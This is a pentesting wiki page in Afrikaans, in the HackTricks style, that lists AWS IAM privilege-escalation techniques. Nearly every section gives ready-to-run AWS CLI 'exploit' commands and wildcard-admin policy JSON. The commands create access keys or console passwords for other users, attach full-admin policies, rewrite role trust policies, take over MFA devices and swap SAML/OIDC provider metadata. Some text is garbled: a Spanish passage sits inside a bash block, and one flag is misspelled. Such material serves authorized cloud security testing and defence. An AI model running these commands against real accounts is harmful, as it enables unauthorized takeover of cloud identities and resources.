# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Vir meer inligting oor IAM, sien:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Gee die vermoë om 'n nuwe IAM policy-weergawe te skep, en om die vereiste vir die `iam:SetDefaultPolicyVersion` toestemming te omseil deur die `--set-as-default` vlag te gebruik. Dit maak dit moontlik om pasgemaakte toestemmings te definieer.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Impact:** Eskaleer direk bevoegdhede deur enige aksie op enige hulpbron toe te laat.

### **`iam:SetDefaultPolicyVersion`**

Laat toe om die standaardweergawe van 'n IAM-beleid na 'n ander bestaande weergawe te verander, wat bevoegdhede kan eskaleer as die nuwe weergawe meer toestemmings het.

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Impak:** Indirekte privilege escalation deur meer permissies toe te laat.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Maak dit moontlik om access key ID en secret access key vir 'n ander gebruiker te skep, wat tot moontlike privilege escalation kan lei.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact:** Direkte verhoging van voorregte deur die aanname van 'n ander gebruiker se uitgebreide toestemmings.

Let daarop dat 'n gebruiker slegs 2 toegangssleutels kan hê, dus as 'n gebruiker reeds 2 toegangssleutels het, sal jy die toestemming `iam:DeleteAccessKey` nodig hê om een daarvan te verwyder sodat jy 'n nuwe een kan skep:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

As jy 'n nuwe virtual MFA device kan skep en dit op 'n ander gebruiker kan aktiveer, kan jy effektief jou eie MFA vir daardie gebruiker inskryf en dan 'n MFA-backed sessie vir hul credentials versoek.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impak:** Direkte privilege escalation deur 'n gebruiker se MFA-registrasie oor te neem (en daarna hul permissions te gebruik).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Laat toe om 'n login profile te skep of by te werk, insluitend die instel van wagwoorde vir AWS console login, wat tot direkte privilege escalation kan lei.

**Exploit for Creation:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit vir Opdatering:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Impak:** Direkte privilege escalation deur aan te meld as "enige" gebruiker.

### **`iam:UpdateAccessKey`**

Laat toe om 'n gedeaktiveerde access key te aktiveer, wat moontlik kan lei tot unauthorized access as die attacker die gedeaktiveerde key besit.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Impak:** Direkte privilege escalation deur toegangssleutels te heraktiveer.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Stel in staat om credentials te genereer of te herstel vir spesifieke AWS-dienste (bv. CodeCommit, Amazon Keyspaces), en neem die toestemmings van die gekoppelde gebruiker aan.

**Exploit for Creation:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**Exploit vir Reset:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impak:** Direct privilege escalation binne die gebruiker se dienspermissies.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Laat toe om beleide aan gebruikers of groepe te heg, wat direk privileges eskaleer deur die toestemmings van die aangehegte beleid te erf.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit vir Groep:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Impak:** Direkte privilege-eskalasie na enigiets wat die beleid toelaat.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Laat toe om beleide aan rolle, gebruikers of groepe te heg of te plaas, wat direkte privilege-eskalasie moontlik maak deur bykomende toestemmings toe te ken.

**Exploit for Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit vir Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Jy kan 'n beleid soos die volgende gebruik:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Impak:** Direkte privilege escalation deur permissies by te voeg via beleide.

### **`iam:AddUserToGroup`**

Maak dit moontlik om jouself by 'n IAM-groep te voeg, escalating privileges deur die groep se permissies te erf.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Impact:** Direkte eskalasie van bevoegdhede tot die vlak van die groep se toestemmings.

### **`iam:UpdateAssumeRolePolicy`**

Laat toe om die assume role policy document van 'n role aan te pas, wat die aanneming van die role en die daarmee geassosieerde toestemmings moontlik maak.

**Uitbuiting:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Waar die beleid soos hieronder lyk, wat die gebruiker toestemming gee om die rol aan te neem:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact:** Direkte privilege escalation deur enige rol se toestemmings aan te neem.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Laat toe om 'n SSH public key op te laai vir verifikasie by CodeCommit en om MFA-toestelle te deaktiveer, wat tot potensiële indirekte privilege escalation kan lei.

**Uitbuiting vir SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit vir MFA-deaktivering:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Impak:** Indirekte privilege escalation deur CodeCommit-toegang aan te skakel of MFA-beskerming uit te skakel.

### **`iam:ResyncMFADevice`**

Laat hersinkronisering van 'n MFA-toestel toe, wat moontlik tot indirekte privilege escalation kan lei deur MFA-beskerming te manipuleer.

**Bash Command:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Indirect privilege escalation deur by te voeg of te manipuleer MFA devices.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Met hierdie permissies kan jy die XML-metagegewens van die SAML-verbinding verander. Daarna kan jy die SAML federation misbruik om te login met enige role wat dit vertrou.

Let wel: as jy dit doen sal legit users nie kan login nie. Dit is egter moontlik om die XML te kry, sodat jy jou eie kan plaas, login en die vorige weer terugstel.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
> [!NOTE]
> TODO: 'n gereedskap wat die SAML metagegewens kan genereer en kan aanmeld met 'n gespesifiseerde rol

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Onseker hieroor) As 'n aanvaller hierdie **permissions** het, kan hy 'n nuwe **Thumbprint** byvoeg en daarin slaag om aan te meld in alle rolle wat die provider vertrou.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Hierdie toestemming laat 'n attacker toe om die permissions boundary van 'n user op te dateer, wat moontlik hul privileges kan eskaleer deur hulle toe te laat om actions uit te voer wat normaalweg deur hul bestaande permissions beperk word.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

'n Akteur met iam:PutRolePermissionsBoundary kan 'n toestemmingsgrens op 'n bestaande rol stel. Die risiko ontstaan wanneer iemand met hierdie toestemming die rol se grens verander: hulle kan bedrywighede onvanpas beperk (wat diensonderbreking veroorsaak) of, as hulle 'n toegeeflike toestemmingsgrens heg, effektief uitbrei wat die rol kan doen en voorregte verhoog.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Verwysings

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
